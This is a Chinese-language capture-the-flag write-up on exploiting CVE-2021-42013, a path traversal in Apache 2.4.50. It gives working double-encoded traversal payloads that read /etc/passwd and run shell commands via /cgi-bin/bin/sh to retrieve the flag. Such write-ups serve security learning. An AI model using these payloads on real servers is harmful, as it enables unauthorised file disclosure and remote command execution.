# Week5 Unsafe Apache 200

## 0、知识点与工具

>   Apache HTTP Server 2.4.50 中的路径遍历和文件泄露漏洞

>   工具：burpsuite



## 1、分析

>   打开页面，页面没什么有用的，查看源代码也没发现什么
>
>   通过burpsuite抓取请求后发现使用的Server是：`Apache/2.4.50 (Unix)`

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/20221214215530.png)

>    然后百度或者谷歌搜索`Apache/2.4.50 (Unix)`的漏洞

## 2、漏洞分析

**影响版本**

>   此漏洞影响 `Apache HTTP Server 2.4.49 和 2.4.50`，**而不会影响更早版本**。

**漏洞形成原理**

>   **CVE-2021-42013 是由于CVE-2021-41773修复不完整而导致的漏洞，**
>
>   **攻击者可以使用路径遍历攻击将 URL 映射到由 Alias-like 指令配置的目录之外的文件。**
>
>   **Apache HTTP Server 2.4.50 修补了以前的 CVE-2021-41773 有效负载**，
>
>   例如：`http://your:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`，但它不完整。
>
>   **可以用`.%%32%65`绕过补丁**，**如果还要访问文件还需要服务器启用mods、[cgi](https://baike.baidu.com/item/CGI/607810)或者cgid**

>   `.%%32%65`的本质是进行两次url编码的字符【.】，将其解码后得到【..】
>
>   在上面那个例子就阔以看出是进行目录切换

**利用方式**

-   通过如下命令可以访问到passwd文件

    ```c
    /icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd
    ```

-   通过如下命令可以执行命令

    ```c
    /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh
    
    echo;命令
    ```

    

## 3、解题

>   根据漏洞的信息，首先get访问如下路径，进行测试

```c
/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd
```

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/20221214230806.png)

>   访问成功，然后执行命令

```c
/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh

echo;ls /
```

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/20221214231101.png)

>   最后获取flag

```c 
/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh

echo;cat /ffffllllaaagggg_cc084c485d
```

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/20221214231139.png)